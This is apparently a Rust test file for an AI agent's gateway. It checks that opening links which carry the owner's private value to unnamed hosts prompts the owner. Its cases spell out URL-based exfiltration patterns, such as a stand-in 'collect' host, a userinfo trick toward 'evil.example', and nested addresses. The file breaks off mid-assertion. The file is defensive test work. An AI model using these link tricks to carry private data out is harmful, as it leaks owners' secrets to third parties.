//! The link rule (GATE-589, the owner's widening of the page-only rule, built as the independent review specified; GATE-590):
//! when FERB opens an address that carries the owner's private value to a host the owner has not named, it asks,
//! unless the address was read as written in a record of a counting kind before FERB wrote any of its values (B), or
//! the value goes back to the same host it was read on, in one source unit's shape (C). F3: at a form's submit the
//! values the page's own address put in the form count as typed.
//!
//! Each case runs the real `Gateway` on a temp store with stand-in tools that report what the real ones report to the
//! gateway (`tests/outside_destinations.rs` mirrors each from its source): `browser.open` / `navigate` (kind
//! open_tab/navigate, site = the address's host), `browser.snapshot` (read; sources the tab's address, and a signed-in
//! page also `owner_account` = private), `browser.act` (type: fill_form with the text as content; a click on a submit
//! control submits its form, `page_url` the tab's address), `browser.tabs` (origin private, each tab's address a
//! source), `shell.run` (its output; never run), the real `fs.read`, and an `fs.write` stand-in that records the file
//! it writes as made by this tree (L39's change records, `made_in_tree`). A record of FERB's conversation is written as
//! the context builder writes it (`context.exposure`, its segments' stored values, GATE-519).
//!
//! The `today_…_is_not_asked` cases are the holes the review documented, measured as they stand.
#![cfg(all(feature = "store", target_os = "macos"))]

#[allow(dead_code)]
mod support;

use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};

use ferb_core::interfaces::{BoxFuture, Clock, IdSource};
use ferb_core::types::{ActionFacts, ActionSpec, Target, ToolContext, ToolResult};
use ferb_core::when::{self, DateTime};
use ferb_gateway::call_hooks::{HookParts, RealHooks};
use ferb_gateway::gateway::{
    Cancel, Deps, FsRoots, Gateway, StoreIds, StoreTime, SyncProtection, TaskRecord, POSIX_FILES,
};
use ferb_gateway::seams::{Describe, QuestionRouter, Usage};
use ferb_gateway::tool::{Args, Facts, Registry, Tool, ToolError, ToolOutput};
use ferb_identity::owner_secrets::Places;
use ferb_policy::confirm::{Apps, AppsUnread, RunningApp};
use ferb_policy::small::{Request, Targets};
use ferb_rpc::auth::{Identity, RunGrant};
use ferb_sanitize::{Py, Redactor};
use ferb_store::Db;
use serde_json::{json, Map, Value};

use support::ledger::RealLedger;

/// The owner's private value (in the owner's notes file, or on a signed-in page).
const V: &str = "7Q4K29XZ";
/// A page that read as outside content (the premise: only after outside content does the rule ask).
const NEWS: &str = "https://news.example/a";
/// A host the owner never named.
const COLLECT: &str = "collect.example.net";
const ASK: &str = "help me with the article at news.example";

// ---------- small stand-ins ----------

struct FakeClock(Mutex<DateTime>);
impl Clock for FakeClock {
    fn now(&self) -> DateTime {
        *self.0.lock().unwrap()
    }
    fn monotonic(&self) -> f64 {
        1000.0
    }
    fn sleep_until(&self, _t: DateTime) -> BoxFuture<'_, ()> {
        Box::pin(async {})
    }
}

struct Seq(Mutex<u64>);
impl IdSource for Seq {
    fn new_id(&self) -> String {
        let mut n = self.0.lock().unwrap();
        *n += 1;
        format!("id-{:06}", *n)
    }
}

struct NoApps;
impl Apps for NoApps {
    fn candidates(&self, _name: &str) -> Result<Vec<RunningApp>, AppsUnread> {
        Ok(Vec::new())
    }
    fn installed_bundle(&self, _name: &str) -> Result<Option<String>, AppsUnread> {
        Ok(None)
    }
    fn is_browser_app(&self, _app: &str) -> bool {
        false
    }
}

struct Words;
impl Describe for Words {
    fn describe(
        &self,
        _tool: &str,
        _args: &Map<String, Value>,
        _kind: &str,
        _site: Option<&str>,
        _app: Option<&str>,
    ) -> String {
        "working".into()
    }
    fn app_name(&self, _app: &str) -> String {
        "an app".into()
    }
}

struct NoTrash;
impl ferb_fs::files::TrashLocator for NoTrash {
    fn trash_url(&self, _near: &str, _create: bool) -> Option<String> {
        None
    }
}

struct NoUsage;
impl Usage for NoUsage {
    fn count<'a>(
        &'a self,
        _path: &'a str,
        _closed: ferb_core::types::PathCheck,
    ) -> BoxFuture<'a, Map<String, Value>> {
        Box::pin(async { Map::new() })
    }
}

struct Router;
impl QuestionRouter for Router {
    fn route<'a>(
        &'a self,
        _t: &'a str,
        question: &'a str,
        _o: &'a [String],
    ) -> BoxFuture<'a, Result<Map<String, Value>, String>> {
        let out = json!({"ask_owner": true, "question": question, "answer": ""})
            .as_object()
            .cloned()
            .unwrap();
        Box::pin(async move { Ok(out) })
    }
}

struct BrowserPlaces;
impl Places for BrowserPlaces {
    fn is_browser(&self, bundle_id: &str) -> bool {
        ["com.google.Chrome"].contains(&bundle_id)
    }
    fn url_host(&self, url: &str) -> Option<String> {
        ferb_policy::urls::parse(url)
            .map(|p| p.host)
            .filter(|h| !h.is_empty())
    }
}

// ---------- the world the stand-in tools read ----------

#[derive(Clone, Default)]
struct Tab {
    url: String,
    /// What FERB typed into the page, shown back by its next read.
    typed: Vec<String>,
}

#[derive(Default)]
struct World {
    tabs: Mutex<BTreeMap<String, Tab>>,
    /// Each page's text by its address, and whether it is a signed-in page (the owner's data).
    pages: Mutex<BTreeMap<String, (String, bool)>>,
    /// What `shell.run` prints.
    shell_output: Mutex<String>,
    /// The files this tree wrote (its change records).
    made: Arc<Mutex<Vec<String>>>,
    /// The owner's open tabs (`browser.tabs`).
    owner_tabs: Mutex<Vec<String>>,
}

fn host(url: Option<&str>) -> Option<String> {
    let h = ferb_gateway::words::host_of(url);
    (!h.is_empty()).then_some(h)
}

fn text(args: &Args, k: &str) -> Option<String> {
    args.get(k).and_then(Value::as_str).map(str::to_string)
}

fn out(content: Value, sources: Vec<(String, String)>) -> ToolOutput {
    ToolOutput::from(ToolResult {
        content: content.as_object().cloned().unwrap(),
        read_sources: sources,
        ..ToolResult::default()
    })
}

struct Browser {
    verb: &'static str,
    name: &'static str,
    w: Arc<World>,
}

impl Browser {
    fn tab_url(&self, args: &Args) -> Option<String> {
        text(args, "tab")
            .and_then(|t| self.w.tabs.lock().unwrap().get(&t).map(|t| t.url.clone()))
            .filter(|p| !p.is_empty())
    }
}

impl Tool for Browser {
    fn name(&self) -> &str {
        self.name
    }
    fn facts(&self) -> Facts {
        if self.verb == "tabs" {
            return Facts {
                origin: Some("private".into()),
                ..Facts::default()
            };
        }
        Facts::default()
    }
    fn describe(&self, args: &Args) -> ActionSpec {
        match self.verb {
            "open" | "navigate" => ActionSpec {
                target: Target {
                    site: host(text(args, "url").as_deref()),
                    ..Target::default()
                },
                ..ActionSpec::new(if self.verb == "open" {
                    "open_tab"
                } else {
                    "navigate"
                })
            },
            "act" => {
                let page = self.tab_url(args);
                let action = text(args, "action").unwrap_or_default();
                let submits = action == "click" && text(args, "element").as_deref() == Some("send");
                ActionSpec {
                    target: Target {
                        site: host(page.as_deref()),
                        page: page.clone(),
                        ..Target::default()
                    },
                    content: (action == "type").then(|| text(args, "text")).flatten(),
                    facts: Some(ActionFacts {
                        submits_form: submits.then_some(true),
                        form_action_host: submits.then(|| host(page.as_deref())).flatten(),
                        form_method: submits.then(|| "POST".to_string()),
                        page_url: page.clone(),
                        tab_chain: text(args, "tab"),
                        control_label: submits.then(|| "Send".to_string()),
                        ..ActionFacts::default()
                    }),
                    ..ActionSpec::new(if action == "type" {
                        "fill_form"
                    } else {
                        "click"
                    })
                }
            }
            "tabs" => ActionSpec::new("read"),
            _ => {
                let page = self.tab_url(args);
                ActionSpec {
                    target: Target {
                        site: host(page.as_deref()),
                        page,
                        ..Target::default()
                    },
                    ..ActionSpec::new("read")
                }
            }
        }
    }
    fn file_paths(&self, _args: &Args) -> Option<Vec<(String, String)>> {
        Some(vec![])
    }
    fn run<'a>(
        &'a self,
        args: &'a Args,
        _ctx: &'a ToolContext,
    ) -> BoxFuture<'a, Result<ToolOutput, ToolError>> {
        Box::pin(async move {
            match self.verb {
                "open" | "navigate" => {
                    let url = text(args, "url").unwrap();
                    let mut tabs = self.w.tabs.lock().unwrap();
                    let tab = text(args, "tab").unwrap_or_else(|| format!("t{}", tabs.len() + 1));
                    tabs.insert(
                        tab.clone(),
                        Tab {
                            url: url.clone(),
                            typed: vec![],
                        },
                    );
                    Ok(out(
                        json!({"tab": tab, "url": url}),
                        vec![("web".into(), url)],
                    ))
                }
                "snapshot" => {
                    let tab = self
                        .w
                        .tabs
                        .lock()
                        .unwrap()
                        .get(&text(args, "tab").unwrap())
                        .cloned()
                        .unwrap();
                    let (page, signed_in) = self
                        .w
                        .pages
                        .lock()
                        .unwrap()
                        .get(&tab.url)
                        .cloned()
                        .unwrap_or_default();
                    let mut shown = page;
                    for t in &tab.typed {
                        shown.push_str(&format!("\ntextbox \"Note\" value: {t}"));
                    }
                    let mut sources = vec![("web".to_string(), tab.url.clone())];
                    if signed_in {
                        // the owner's browser: a signed-in page also reports its account (tools.rs:1506)
                        sources.push((
                            "owner_account".into(),
                            format!("{}|", host(Some(&tab.url)).unwrap_or_default()),
                        ));
                    }
                    Ok(out(json!({"url": tab.url, "text": shown}), sources))
                }
                "act" => {
                    let tab = text(args, "tab").unwrap();
                    let mut tabs = self.w.tabs.lock().unwrap();
                    let t = tabs.get_mut(&tab).unwrap();
                    if text(args, "action").as_deref() == Some("type") {
                        t.typed.push(text(args, "text").unwrap_or_default());
                    }
                    Ok(out(
                        json!({"ok": true}),
                        vec![("web".into(), t.url.clone())],
                    ))
                }
                _ => {
                    let tabs = self.w.owner_tabs.lock().unwrap().clone();
                    let rows: Vec<Value> = tabs
                        .iter()
                        .enumerate()
                        .map(|(i, u)| json!({"tab_ref": format!("chrome:Default:{i}"), "url": u}))
                        .collect();
                    Ok(out(
                        json!({"tabs": rows}),
                        tabs.iter()
                            .map(|u| ("web".to_string(), u.clone()))
                            .collect(),
                    ))
                }
            }
        })
    }
}

/// `shell.run` as the gateway sees it (ferb-shell's own describe); the command never runs, its output is the world's.
struct Shell {
    w: Arc<World>,
}

impl Tool for Shell {
    fn name(&self) -> &str {
        "shell.run"
    }
    fn describe(&self, args: &Args) -> ActionSpec {
        ferb_shell::tools::describe("shell.run", args).unwrap()
    }
    fn run<'a>(
        &'a self,
        _args: &'a Args,
        _ctx: &'a ToolContext,
    ) -> BoxFuture<'a, Result<ToolOutput, ToolError>> {
        Box::pin(async move {
            let output = self.w.shell_output.lock().unwrap().clone();
            Ok(out(
                json!({"id": "p1", "running": false, "exit_code": 0, "output": output}),
                vec![],
            ))
        })
    }
}

/// `fs.write` as the gateway sees it: kind write on its path; it writes the file and the tree's change records note it.
struct Write {
    w: Arc<World>,
}

impl Tool for Write {
    fn name(&self) -> &str {
        "fs.write"
    }
    fn describe(&self, args: &Args) -> ActionSpec {
        ActionSpec {
            target: Target {
                path: text(args, "path"),
                ..Target::default()
            },
            content: text(args, "text"),
            ..ActionSpec::new("write")
        }
    }
    fn file_paths(&self, args: &Args) -> Option<Vec<(String, String)>> {
        Some(vec![(text(args, "path").unwrap(), "write".into())])
    }
    fn run<'a>(
        &'a self,
        args: &'a Args,
        _ctx: &'a ToolContext,
    ) -> BoxFuture<'a, Result<ToolOutput, ToolError>> {
        Box::pin(async move {
            let path = text(args, "path").unwrap();
            std::fs::write(&path, text(args, "text").unwrap_or_default()).unwrap();
            self.w.made.lock().unwrap().push(
                std::fs::canonicalize(&path)
                    .unwrap()
                    .to_str()
                    .unwrap()
                    .to_string(),
            );
            Ok(out(json!({"path": path, "written": true}), vec![]))
        })
    }
}

// ---------- one task ----------

struct Run {
    gw: Arc<Gateway>,
    db: Arc<Mutex<Db>>,
    w: Arc<World>,
    grant: RunGrant,
    /// The owner's notes file holding `V`.
    notes: String,
    /// The owner's Documents folder.
    docs: std::path::PathBuf,
    _dir: tempfile::TempDir,
}

fn start() -> DateTime {
    when::parse("2026-01-01T09:00:00+00:00").unwrap()
}

fn task(words: &str, sites: &[&str]) -> Run {
    let dir = tempfile::Builder::new().prefix("flr").tempdir().unwrap();
    let home = dir.path().join("ferb");
    let user = dir.path().join("user");
    std::fs::create_dir_all(home.join("workspace")).unwrap();
    std::fs::create_dir_all(user.join("Documents")).unwrap();
    let docs = std::fs::canonicalize(user.join("Documents")).unwrap();
    let notes = docs.join("notes.txt");
    std::fs::write(&notes, format!("my notes\nmember {V} since May\n")).unwrap();
    let notes = notes.to_str().unwrap().to_string();
    let db = Db::open(home.join("ferb.db")).unwrap();
    db.migrate().unwrap();
    let db = Arc::new(Mutex::new(db));
    let clock = Arc::new(FakeClock(Mutex::new(start())));
    let ids: Arc<dyn IdSource> = Arc::new(Seq(Mutex::new(0)));
    let redactor = Arc::new(Redactor::new(&[], &[]));
    let ledger = Arc::new(RealLedger {
        db: db.clone(),
        clock: clock.clone(),
        ids: ids.clone(),
    });
    let never_read = json!(ferb_policy::protection::default_never_read());
    let never_write = json!(ferb_policy::protection::DEFAULT_NEVER_WRITE);
    let terminals = json!(ferb_policy::protection::DEFAULT_TERMINAL_APPS);
    let ports = json!([]);
    let lists = ferb_policy::protection::Lists {
        never_read: &never_read,
        never_write: &never_write,
        terminal_apps: &terminals,
        local_ports: &ports,
    };
    let protection = ferb_policy::protection::Protection::new(
        user.to_str().unwrap(),
        home.to_str().unwrap(),
        &lists,
        None,
        &POSIX_FILES,
    )
    .unwrap();
    let w = Arc::new(World::default());
    w.pages
        .lock()
        .unwrap()
        .insert(NEWS.into(), ("Rates rise. More at the site.".into(), false));
    let mut reg = Registry::new();
    for (verb, name) in [
        ("open", "browser.open"),
        ("navigate", "browser.navigate"),
        ("snapshot", "browser.snapshot"),
        ("act", "browser.act"),
        ("tabs", "browser.tabs"),
    ] {
        reg.add(Arc::new(Browser {
            verb,
            name,
            w: w.clone(),
        }))
        .unwrap();
    }
    reg.add(Arc::new(Shell { w: w.clone() })).unwrap();
    reg.add(Arc::new(Write { w: w.clone() })).unwrap();
    let env = ferb_fs::files::FsEnv {
        home: user.to_str().unwrap().to_string(),
        trash: Arc::new(NoTrash),
        full_disk_access: Arc::new(|| true),
    };
    reg.add(Arc::new(ferb_gateway::adapters::fs::FsTool::new(
        ferb_fs::files::FS_READ,
        env,
    )))
    .unwrap();
    let made = w.made.clone();
    let deps = Deps {
        db: db.clone(),
        clock: clock.clone(),
        ids: ids.clone(),
        redactor: redactor.clone(),
        ledger,
        publish: Box::new(|_topic, _data: Py| {}),
        roots: FsRoots {
            workspace: home.join("workspace").to_str().unwrap().to_string(),
            owner_roots: vec![],
            untrusted_roots: vec![],
            home: user.to_str().unwrap().to_string(),
            protection: Arc::new(SyncProtection(protection)),
        },
        device_id: "dev".into(),
        recovery: Arc::new(ferb_gateway::adapters::fs::FsRecovery {
            db: db.clone(),
            clock: clock.clone(),
            ids: ids.clone(),
            root: home.join("recovery").to_str().unwrap().to_string(),
        }),
        snapshots: None,
        usage: Arc::new(NoUsage),
        apps: Arc::new(NoApps),
        describe: Arc::new(Words),
        journal_problem: Box::new(|_k, _d| {}),
        profile_name: Box::new(|_b, f| f.to_string()),
        profile_account: Box::new(|_b, _f| String::new()),
        owner_contacts: Box::new(Vec::new),
        pay_same_site_forms: Box::new(|| true),
        on_path: Box::new(|_p, _t| {}),
        proc_task: Box::new(|p| (p == "p1").then(|| "task-1".to_string())),
        route_question: Some(Arc::new(Router)),
        hooks: Arc::new(RealHooks::new(HookParts {
            sentinel: None,
            previews: None,
            evidence: None,
            changes: None,
            images: None,
            app_windows: None,
            shadow: None,
            publish: Arc::new(|_t, _d| {}),
            journal: Arc::new(|_k, _d| {}),
            workspace: home.join("workspace").to_str().unwrap().to_string(),
            home: user.to_str().unwrap().to_string(),
        })),
        made_in_tree: Some(Box::new(move |_root, real| {
            made.lock().unwrap().iter().any(|m| m == real)
        })),
        excluded_host: None,
        owner_secrets: None,
        places: Arc::new(BrowserPlaces),
        username_holds: None,
    };
    let counter = Mutex::new(0u64);
    let gw = Arc::new(Gateway::new(reg, deps, move || {
        let mut n = counter.lock().unwrap();
        *n += 1;
        format!("ap-{n}")
    }));
    gw.record_request(Request {
        request_id: "req-1".into(),
        words: words.to_string(),
        targets: Targets {
            sites: sites.iter().map(|s| s.to_string()).collect(),
            ..Targets::default()
        },
        payload: String::new(),
        asked_origins: BTreeSet::new(),
    });
    let now = start();
    let span_id = {
        let d = db.lock().unwrap();
        let red = redactor.clone();
        let spans = ferb_store::spans::SpanStore::new(
            &d,
            Box::new(StoreTime(clock.clone())),
            Box::new(StoreIds(ids.clone())),
            Box::new(move |v: &Value| red.value(v)),
            Box::new(|_k: &str| false),
        );
        let id = spans
            .start("task", &json!({}), Some("task-1"), None, None)
            .unwrap()
            .id;
        let at = when::isoformat(&now);
        d.conn()
            .execute(
                "INSERT INTO tasks (id, tree_id, parent_id, request_id, goal, identity, role, scopes_json, status, \
                 created_at, updated_at) VALUES ('task-1', 'task-1', NULL, 'req-1', 'g', 'owner', 'worker', ?, \
                 'running', ?, ?)",
                rusqlite::params!["[]", at, at],
            )
            .unwrap();
        id
    };
    gw.add_task(TaskRecord {
        task_id: "task-1".into(),
        request_id: "req-1".into(),
        started_at: now,
        deadline: Some(now + chrono::Duration::minutes(10)),
        span_id,
        tree_id: None,
    });
    let scopes: BTreeSet<String> = [
        "browser:read",
        "browser:act",
        "shell",
        "fs:read",
        "fs:write",
    ]
    .into_iter()
    .map(str::to_string)
    .collect();
    let grant = RunGrant {
        task_id: "task-1".into(),
        worker_id: "w1".into(),
        scopes,
        identity: Identity::Owner,
        expires_at: 1e9,
        observe_only: false,
        tools: BTreeSet::new(),
        max_calls: 0,
    };
    Run {
        gw,
        db,
        w,
        grant,
        notes,
        docs,
        _dir: dir,
    }
}

impl Run {
    fn questions(&self) -> Vec<Vec<String>> {
        let db = self.db.lock().unwrap();
        let mut st = db
            .conn()
            .prepare(
                "SELECT json_extract(input_json, '$.args.confirm') FROM spans WHERE kind = 'tool.call' AND \
                 json_extract(input_json, '$.tool') = 'owner.ask' ORDER BY rowid",
            )
            .unwrap();
        let rows: Vec<Option<String>> = st
            .query_map([], |r| r.get(0))
            .unwrap()
            .collect::<Result<_, _>>()
            .unwrap();
        rows.into_iter()
            .map(|c| {
                let v: Value = serde_json::from_str(&c.unwrap_or_else(|| "[]".into())).unwrap();
                v.as_array()
                    .unwrap()
                    .iter()
                    .map(|n| n["rule"].as_str().unwrap().to_string())
                    .collect()
            })
            .collect()
    }

    /// One call; every question FERB asks is answered No. Returns the rules of the questions asked.
    async fn call(&self, tool: &str, args: Value) -> Vec<String> {
        let before = self.questions().len();
        let args = args.as_object().cloned().unwrap();
        let gw = self.gw.clone();
        let grant = self.grant.clone();
        let name = tool.to_string();
        let job = async move {
            gw.call_as(&grant, &name, &args, Cancel::new(), Arc::new(|| false))
                .await
        };
        tokio::pin!(job);
        let mut seen: BTreeSet<String> = BTreeSet::new();
        loop {
            tokio::select! {
                biased;
                r = &mut job => { r.expect("the call returns"); break; }
                () = tokio::task::yield_now() => {
                    if let Some(ap) = self.gw.pending().into_iter().find(|a| !seen.contains(&a.id)) {
                        seen.insert(ap.id.clone());
                        let i = ap.options.iter().position(|o| o == "No").map_or(ap.options.len(), |i| i + 1);
                        self.gw.resolve(&ap.id, true, Some(i), None).unwrap();
                    }
                }
            }
        }
        self.questions()[before..].concat()
    }

    /// A call that must not ask.
    async fn quiet(&self, tool: &str, args: Value) {
        let asked = self.call(tool, args).await;
        assert!(asked.is_empty(), "{tool} asked {asked:?}");
    }

    fn page(&self, url: &str, text: &str, signed_in: bool) {
        self.w
            .pages
            .lock()
            .unwrap()
            .insert(url.to_string(), (text.to_string(), signed_in));
    }

    /// Open a page and read it (neither asks).
    async fn read_page(&self, url: &str) -> String {
        self.quiet("browser.open", json!({"url": url})).await;
        let tab = format!("t{}", self.w.tabs.lock().unwrap().len());
        self.quiet("browser.snapshot", json!({"tab": tab})).await;
        tab
    }

    /// Read the outside page (the premise) and the owner's notes (the private value).
    async fn outside_and_notes(&self) {
        self.read_page(NEWS).await;
        self.quiet("fs.read", json!({"path": self.notes})).await;
    }

    /// Whether opening `url` asks the link question.
    async fn opening_asks(&self, url: &str) -> bool {
        let asked = self.call("browser.open", json!({"url": url})).await;
        asked.iter().any(|r| r == "sink:private_url")
    }

    /// A record of FERB's conversation (`context.exposure`) as the context builder stores it: one entry FERB wrote,
    /// its stored values with their classes (GATE-519).
    fn conversation(&self, entry: &str, values: &[(&str, &[&str])]) {
        let values: Map<String, Value> = values
            .iter()
            .map(|(v, cs)| (v.to_string(), json!(cs)))
            .collect();
        let output = json!({"payload": entry, "segments": [
            {"len": entry.chars().count(), "kinds": ["ferb"], "whole": false, "values": values}
        ]});
        let db = self.db.lock().unwrap();
        let n: i64 = db
            .conn()
            .query_row("SELECT count(*) FROM spans", [], |r| r.get(0))
            .unwrap();
        db.conn()
            .execute(
                "INSERT INTO spans (id, task_id, kind, started_at, ended_at, input_json, output_json, origin) VALUES \
                 (?, 'task-1', 'context.exposure', '2026-01-01T09:00:00+00:00', '2026-01-01T09:00:00+00:00', '{}', \
                 ?, 'private')",
                rusqlite::params![format!("ctx-{n}"), output.to_string()],
            )
            .unwrap();
    }
}

fn link(host: &str) -> String {
    format!("https://{host}/r?m={V}")
}

// ================= B: the address read as written =================

// B1: a file FERB wrote never counts by its own text (and B2: its writing holds the value first).
// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn a_link_ferb_wrote_to_a_file_then_read_asks() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    let path = r.docs.join("links.txt");
    let path = path.to_str().unwrap();
    let written = r
        .call(
            "fs.write",
            json!({"path": path, "text": format!("see {}", link(COLLECT))}),
        )
        .await;
    assert!(!written.contains(&"sink:private_url".to_string()));
    r.quiet("fs.read", json!({"path": path})).await;
    assert!(r.opening_asks(&link(COLLECT)).await);
}

// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn a_link_from_shell_output_asks() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    *r.w.shell_output.lock().unwrap() = format!("found: {}\n", link(COLLECT));
    r.quiet("shell.run", json!({"command": "grep -r member ."}))
        .await;
    assert!(r.opening_asks(&link(COLLECT)).await);
}

// B2: FERB typed the address into a page, and the page shows it back: the record is later than FERB's writing.
// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn a_link_ferb_typed_into_a_page_then_read_back_asks() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    r.page("https://board.example/t", "Notes board", false);
    let tab = r.read_page("https://board.example/t").await;
    r.quiet(
        "browser.act",
        json!({"tab": tab, "action": "type", "element": "e1", "text": link(COLLECT)}),
    )
    .await;
    r.quiet("browser.snapshot", json!({"tab": tab})).await;
    assert!(r.opening_asks(&link(COLLECT)).await);
}

// B2: a results page reflecting FERB's own search value in a link to another host.
// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn a_result_link_reflecting_ferbs_own_search_value_to_another_host_asks() {
    let r = task(
        "search search.example for my member number",
        &["search.example"],
    );
    r.outside_and_notes().await;
    let search = format!("https://search.example/?q={V}");
    r.page(&search, &format!("Results: {}", link(COLLECT)), false);
    r.read_page(&search).await;
    assert!(r.opening_asks(&link(COLLECT)).await);
}

// A value FERB's earlier reply stored as found nowhere (`private` only): no record of that task had the link.
// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn a_link_in_ferbs_earlier_reply_that_no_record_had_asks() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    let address = link(COLLECT);
    r.conversation(
        &format!("FERB: open {address} next"),
        &[
            (&py_lower(&address), &["private"]),
            (&py_lower(V), &["private"]),
        ],
    );
    assert!(r.opening_asks(&address).await);
}

// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn a_link_in_an_earlier_reply_that_a_record_of_that_earlier_task_had_passes() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    let address = link(COLLECT);
    let site: &[&str] = &["site:mail.example.com/inbox"];
    r.conversation(
        &format!("FERB: the mail links {address}"),
        &[(&py_lower(&address), site), (&py_lower(V), &["private"])],
    );
    assert!(!r.opening_asks(&address).await);
}

fn py_lower(s: &str) -> String {
    s.to_lowercase()
}

// B3: a wrapped link counts only when no break falls immediately before or inside the value.
// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn a_wrapped_link_whose_break_is_before_the_value_asks() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    r.page(
        "https://mail.example.com/inbox",
        &format!("Track it: https://track.example.org/p?id=\n{V} today"),
        true,
    );
    r.read_page("https://mail.example.com/inbox").await;
    assert!(
        r.opening_asks(&format!("https://track.example.org/p?id={V}"))
            .await
    );
}

// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn a_wrapped_link_whose_break_is_outside_the_value_passes() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    r.page(
        "https://mail.example.com/inbox",
        &format!("Track it: https://track.exam\nple.org/p?id={V} today"),
        true,
    );
    r.read_page("https://mail.example.com/inbox").await;
    assert!(
        !r.opening_asks(&format!("https://track.example.org/p?id={V}"))
            .await
    );
}

// B4: read order between the record and the value's first private read is not a condition.
// decision: GATE-589
// decision: GATE-590
#[tokio::test]
async fn a_link_a_page_shows_counts_in_any_read_order() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    r.page(
        "https://mail.example.com/inbox",
        &format!("Your parcel: {}", link(COLLECT)),
        false,
    );
    r.read_page("https://mail.example.com/inbox").await;
    assert!(!r.opening_asks(&link(COLLECT)).await);
}

// ================= C: the same host =================

/// A signed-in page of `host` showing `text`, read after the outside page.
async fn signed_in(r: &Run, url: &str, text: &str) {
    r.page(url, text, true);
    r.read_page(url).await;
}

// C2: one private occurrence anywhere else (the owner's file) cancels it.
// decision: GATE-589
#[tokio::test]
async fn a_value_also_in_the_owners_file_does_not_go_to_the_host_a_candidate_link_names() {
    let r = task(ASK, &[]);
    r.outside_and_notes().await;
    signed_in(
        &r,
        "https://portal.example/home",
        &format!("Member {V}. Verify at https://portal.example/verify/{V}"),
    )
    .await;
    assert!(
        r.opening_asks(&format!("https://portal.example/x?c={V}"))
            .await
    );
}

// C3: two values read on one host, in one address, come from two units.
// decision: GATE-589
// decision: GATE-591
#[tokio::test]
async fn two_values_read_on_one_host_in_one_address_ask() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(
        &r,
        "https://bank.example/accounts",
        "Account 55512345 reference ZX9900AB",
    )
    .await;
    assert!(
        r.opening_asks("https://bank.example/transfer?a=55512345&r=ZX9900AB")
            .await
    );
    // either one alone goes back to its host
    assert!(
        !r.opening_asks("https://bank.example/transfer?a=55512345")
            .await
    );
}

// decision: GATE-589
#[tokio::test]
async fn an_id_from_another_record_on_the_same_host_asks() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(
        &r,
        "https://mail.example.com/inbox",
        "Shared with you: https://docs.example.com/d/DOC4242A/view",
    )
    .await;
    signed_in(&r, "https://docs.example.com/home", "Shared drive SHR77Q1").await;
    assert!(
        r.opening_asks("https://docs.example.com/d/DOC4242A/view?share=SHR77Q1")
            .await
    );
    assert!(
        !r.opening_asks("https://docs.example.com/d/DOC4242A/view")
            .await
    );
}

/// A value read on a signed-in page of docs.example.com only.
async fn docs_value(r: &Run) {
    r.read_page(NEWS).await;
    signed_in(r, "https://docs.example.com/home", &format!("Your doc {V}")).await;
}

// C4: a nested address in the destination.
// decision: GATE-589
// decision: GATE-591
#[tokio::test]
async fn a_nested_address_in_a_query_asks() {
    let r = task(ASK, &[]);
    docs_value(&r).await;
    assert!(
        r.opening_asks(&format!(
            "https://docs.example.com/go?to=https://{COLLECT}/&id={V}"
        ))
        .await
    );
    assert!(
        !r.opening_asks(&format!("https://docs.example.com/go?id={V}"))
            .await
    );
}

// decision: GATE-589
// decision: GATE-591
#[tokio::test]
async fn a_schemeless_host_in_a_path_asks() {
    let r = task(ASK, &[]);
    docs_value(&r).await;
    assert!(
        r.opening_asks(&format!("https://docs.example.com/go/{COLLECT}/{V}"))
            .await
    );
}

// C1: scheme, port, userinfo.
// decision: GATE-589
#[tokio::test]
async fn http_for_an_https_source_asks() {
    let r = task(ASK, &[]);
    docs_value(&r).await;
    assert!(
        r.opening_asks(&format!("http://docs.example.com/x/{V}"))
            .await
    );
}

// decision: GATE-589
#[tokio::test]
async fn another_port_asks() {
    let r = task(ASK, &[]);
    docs_value(&r).await;
    assert!(
        r.opening_asks(&format!("https://docs.example.com:8443/x/{V}"))
            .await
    );
    assert!(
        !r.opening_asks(&format!("https://docs.example.com:443/x/{V}"))
            .await
    );
}

// decision: GATE-589
#[tokio::test]
async fn userinfo_asks() {
    let r = task(ASK, &[]);
    docs_value(&r).await;
    assert!(
        r.opening_asks(&format!("https://me@docs.example.com/x/{V}"))
            .await
    );
}

// Same host: nothing but lowercase, a trailing dot and one leading www.
// decision: GATE-589
// decision: GATE-591
#[tokio::test]
async fn a_host_under_the_source_host_asks() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(&r, "https://example.com/account", &format!("Your id {V}")).await;
    assert!(
        r.opening_asks(&format!("https://files.example.com/x/{V}"))
            .await
    );
    assert!(
        !r.opening_asks(&format!("https://www.example.com/x/{V}"))
            .await
    );
}

// decision: GATE-589
#[tokio::test]
async fn a_sibling_host_asks() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(&r, "https://alice.github.io/", &format!("Ref {V}")).await;
    assert!(r.opening_asks(&format!("https://bob.github.io/{V}")).await);
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(&r, "https://mail.example.com/inbox", &format!("Ref {V}")).await;
    assert!(
        r.opening_asks(&format!("https://sites.example.com/{V}"))
            .await
    );
}

// decision: GATE-589
#[tokio::test]
async fn trusted_at_evil_userinfo_is_evils_host() {
    let r = task(ASK, &[]);
    r.read_page(NEWS).await;
    signed_in(&r, "https://trusted.example/home", &format!("Your id {V}")).await;
    let asked = r
        .call(
            "browser.open",
            json!({"url": format!("https://trusted.example@evil.example/x/{V}")}),
        )
        .await;
    assert_eq!(asked, ["sink:private_url"]);
    assert_eq!(
